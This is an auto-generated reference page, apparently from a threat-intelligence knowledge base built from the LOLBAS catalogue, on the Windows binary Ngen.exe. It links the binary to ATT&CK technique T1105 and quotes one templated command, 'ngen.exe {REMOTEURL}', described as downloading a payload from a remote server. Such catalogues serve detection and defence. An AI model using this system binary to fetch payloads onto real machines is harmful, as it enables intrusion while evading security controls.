---
parsed_by: focuslocust
source: lolbas
type: generated
---
# Ngen.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `ngen.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Ngen.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

Microsoft Native Image Generator.

## Fast Retrieval

- Platform: `windows`
- Command page: [commands](../../commands/windows/ngen.md)
- Source verification: [source record](../../sources/lolbas/ngen.exe.md)

## Aliases

- `Ngen.exe`
- `ngen.exe`

## Related ATT&CK Techniques

| Item | Relationship | Confidence | Evidence |
| --- | --- | --- | --- |
| [T1105 - Ingress Tool Transfer](../../attack/techniques/T1105-ingress-tool-transfer.md) | explicit | source | Command metadata lists T1105: ngen.exe {REMOTEURL} |

## Source Verification

[source record](../../sources/lolbas/ngen.exe.md)

## Evidence Excerpt

```text
Acknowledgement:
- Handle: '@AvihayEldad'
Person: Avihay Eldad
Author: Avihay Eldad
Commands:
- Category: Download
Command: ngen.exe {REMOTEURL}
Description: Downloads payload from remote server using the Microsoft Native Image Generator utility.
```
